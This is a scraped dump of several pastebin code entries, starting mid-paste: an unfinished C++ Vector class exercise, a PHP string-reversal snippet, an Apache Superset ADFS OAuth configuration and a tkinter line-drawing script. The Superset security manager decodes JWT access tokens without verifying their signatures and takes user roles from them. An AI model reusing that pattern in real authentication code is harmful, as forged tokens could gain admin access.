	void erase(const int index) {
		// удаление элемента по указанному индексу
	}

	void set_value(const int index, const int value) {
		// изменяет значение элемента по указанному индексу на value
	}

	int get_value(const int index) {
		// возвращает значение элемента по указанному индексу
	}

	void pop_back() {
		if (size_ > 0) {
			size_--;
		}
	}

	void print() {
		for (int i = 0; i < size_; i++) {
			cout << arr_[i] << "" "";
		}
		cout << endl;
	}

private:

	void check_capacity() {
		if (size_ == capacity_) {
			int* temp = new int[capacity_ * 2];
			for (int i = 0; i < size_; i++) {
				temp[i] = arr_[i];
			}
			delete[] arr_;
			arr_ = temp;
			capacity_ *= 2;
		}
	}

	int* arr_; // хранилище
	int size_; // текущее количество элементов
	int capacity_; // емкость хранилища
};

int main() {
	setlocale(LC_ALL, ""ru"");

	Vector vec1;
	
	vec1.push_back(10);
	vec1.push_back(15);
	vec1.push_back(20);
	vec1.push_back(25);

	vec1.print();

	vec1.pop_back();
	vec1.print();

	vec1.insert(2, 44);
	vec1.print();

}
"
bvTKDr5S,Application for Senior PHP Developer,primoashbee,PHP,Tuesday 13th of February 2024 05:36:28 AM CDT,"<?php

    function reverseStringToHireAshbee(string $string)
    {
        $length = strlen($string);
        $reversedString = """";
        for($x = $length - 1; $x >= 0; $x--)
        {
            $reversedString.=$string[$x];
        }
        return $reversedString;
    }

    echo reverseStringToHireAshbee('reverse');

?>"
LQSp7P9x,Untitled,35657,C++,Tuesday 13th of February 2024 05:03:58 AM CDT,"#include <iostream>
#include <vector>


using namespace std;

class Vector {

public:
	Vector() {
		arr_ = new int[4];
		size_ = 0;
		capacity_ = 4;
	}

	Vector(const int capacity) {
		arr_ = new int[capacity];
		size_ = 0;
		capacity_ = capacity;
	}

	void push_back(const int value) {
		if (size_ == capacity_) {
			int* temp = new int[capacity_ * 2];
			for (int i = 0; i < size_; i++) {
				temp[i] = arr_[i];
			}
			delete[] arr_;
			arr_ = temp;
			capacity_ *= 2;
		}
		arr_[size_] = value;
		size_++;
	}

	void insert(const int index, const int value) {

	}

	void pop_back() {
		if (size_ > 0) {
			size_--;
		}
	}

	void print() {
		for (int i = 0; i < size_; i++) {
			cout << arr_[i] << "" "";
		}
		cout << endl;
	}

private:
	int* arr_; // хранилище
	int size_; // текущее количество элементов
	int capacity_; // емкость хранилища
};

int main() {
	setlocale(LC_ALL, ""ru"");

	Vector vec1;
	
	vec1.push_back(10);
	vec1.push_back(15);
	vec1.push_back(20);
	vec1.push_back(25);

	vec1.print();

	vec1.pop_back();
	vec1.print();
}
"
xCWDQPfH,oauth adsf,pashalvov,Python,Tuesday 13th of February 2024 04:41:40 AM CDT,"################ Файл superset_config.py
from custom_sso_security_manager import CustomSsoSecurityManager

CUSTOM_SECURITY_MANAGER = CustomSsoSecurityManager

###### OAUTH AUTH

AUTH_TYPE = AUTH_OAUTH
AUTH_USER_REGISTRATION = True
AUTH_USER_REGISTRATION_ROLE = ""ReportViewOnly""
AUTH_ROLES_SYNC_AT_LOGIN = True

AUTH_ROLES_MAPPING = {
    ""Users"": [""ReportViewOnly""],
    ""Admins"": [""Admin""],
    ""Gamma"": [""Gamma""],
}

OAUTH_PROVIDERS = [
{
   'name': 'adfs',
        'icon': 'fa-key',
        'token_key': 'access_token',
        'remote_app': {
            'client_id': 'client_id',
            'client_secret': 'client_secret',
            'api_base_url': 'https://ouath/',
            'client_kwargs':{
              'scope': 'profile'
            },
            'request_token_url': None,
            'access_token_url': 'https://ouath/adfs/oauth2/token',
            'authorize_url': 'https://ouath/adfs/oauth2/authorize'
   }
}]

################ Файл custom_sso_security_manager.py там же где и superset_config.py
import logging
import requests
import jwt
from superset.security import SupersetSecurityManager


class CustomSsoSecurityManager(SupersetSecurityManager):
    def oauth_user_info(self, provider, response=None):
        logging.debug(""Oauth2 provider: {0}."".format(provider))
        if provider == ""adfs"":
            access_token = response[""access_token""]
            # logging.debug(""АААааа! Токен: {0}"".format(access_token))
            decoded = jwt.decode(access_token, options={""verify_signature"": False})
            # decoded = jwt.decode(access_token, verify=False)
            logging.debug(""Свойства AD: {0}"".format(decoded))
            return {
                ""email"": decoded[""email""],
                # ""id"": user_data[""login""],
                ""username"": decoded[""login""],
                ""first_name"": decoded[""firstName""],
                ""last_name"": decoded[""lastName""],
                ""role_keys"": decoded[""roles""],
            }"
c1RLWU2f,# tk_alias_line_draw.py,here2share,Python,Tuesday 13th of February 2024 04:27:25 AM CDT,"# tk_alias_line_draw.py

import tkinter as tk

def draw_line(point_a, point_b):
    num_squares = max(abs(point_b[0] - point_a[0]), abs(point_b[1] - point_a[1]))
    square_size = 5

    # Draw the line using squares
    for i in range(0, num_squares + 1, square_size):
        x = point_a[0] + i * (point_b[0] - point_a[0]) / num_squares
        y = point_a[1] + i * (point_b[1] - point_a[1]) / num_squares

        canvas.create_rectangle(x, y, x + square_size - 1, y + square_size - 1, outline="""", fill=""black"")

# Example of usage
root = tk.Tk()
canvas = tk.Canvas(root, width=300, height=300)
canvas.pack()

point_a = (100, 50)
point_b = (250, 200)

draw_line(point_a, point_b)

root.mainloop()"
